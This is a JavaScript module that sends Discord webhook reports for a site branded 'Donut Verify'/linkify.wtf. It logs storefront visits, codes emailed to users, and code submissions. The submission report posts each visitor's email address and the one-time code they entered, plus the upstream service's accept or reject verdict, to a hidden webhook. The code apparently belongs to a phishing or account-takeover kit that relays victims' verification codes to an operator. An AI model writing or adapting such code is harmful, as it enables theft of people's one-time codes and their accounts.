/* Posts embed lines to the Discord channel wired up by VISIT_WEBHOOK.

   Lives beside the functions it serves rather than in the page, so the webhook
   URL is never something a visitor can read out of view-source. */

const MAX = 900; // Discord rejects field values over 1024 characters

const clip = (value) => String(value == null ? '' : value).slice(0, MAX) || '—';

/* The upstream payload is the interesting part when something misbehaves, so
   it is pretty-printed rather than squeezed onto one line. */
function block(value) {
  const text = typeof value === 'string' ? value : JSON.stringify(value, null, 2);
  return '```json\n' + String(text == null ? '' : text).slice(0, MAX) + '\n```';
}

async function post(embed) {
  const hook = process.env.VISIT_WEBHOOK;
  if (!hook) return false;
  try {
    await fetch(hook, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ username: 'Donut Verify', embeds: [embed] })
    });
    return true;
  } catch {
    // A reporting failure must never break the thing being reported on.
    return false;
  }
}

function stamp() {
  return new Date().toLocaleString('en-US', {
    weekday: 'long', hour: 'numeric', minute: '2-digit', timeZone: 'UTC'
  });
}

export function reportVisit({ page, ref }) {
  const fields = [{ name: 'Link', value: clip(page), inline: false }];
  if (ref) fields.push({ name: 'Referrer', value: clip(ref), inline: false });
  return post({
    title: '👀 New checkout visit',
    description: 'Someone opened the storefront.',
    color: 0x5865f2,
    fields,
    footer: { text: `linkify.wtf • ${stamp()} UTC` }
  });
}

/* Fires when a code is emailed, carrying the whole response body. */
export function reportSend({ email, ok, http, taskId, display, data }) {
  const fields = [
    { name: 'Email', value: clip(email), inline: true },
    { name: 'Result', value: ok ? '✅ Code sent' : '❌ Send failed', inline: true },
    { name: 'HTTP', value: clip(http), inline: true }
  ];
  if (display) fields.push({ name: 'Sent to', value: clip(display), inline: true });
  if (taskId) fields.push({ name: 'Task', value: '`' + clip(taskId) + '`', inline: false });
  fields.push({ name: 'API response', value: block(data), inline: false });

  return post({
    title: ok ? '📨 Code emailed' : '⚠️ Send failed',
    color: ok ? 0x5865f2 : 0xed4245,
    fields,
    footer: { text: `linkify.wtf • ${stamp()} UTC` }
  });
}

/* Fires when a code is submitted, carrying the address, the code and the
   upstream verdict. */
export function reportAttempt({ email, code, ok, http, why, data }) {
  const fields = [
    { name: 'Email', value: clip(email), inline: true },
    { name: 'Code', value: '`' + clip(code) + '`', inline: true },
    { name: 'Result', value: ok ? '✅ Accepted' : '❌ Rejected', inline: true }
  ];
  if (http != null) fields.push({ name: 'HTTP', value: clip(http), inline: true });
  if (why) fields.push({ name: 'Reason', value: clip(why), inline: false });
  fields.push({ name: 'API response', value: block(data), inline: false });

  return post({
    title: ok ? '🎉 Claim verified' : '🔑 Code attempt',
    color: ok ? 0x57f287 : 0xfaa61a,
    fields,
    footer: { text: `linkify.wtf • ${stamp()} UTC` }
  });
}
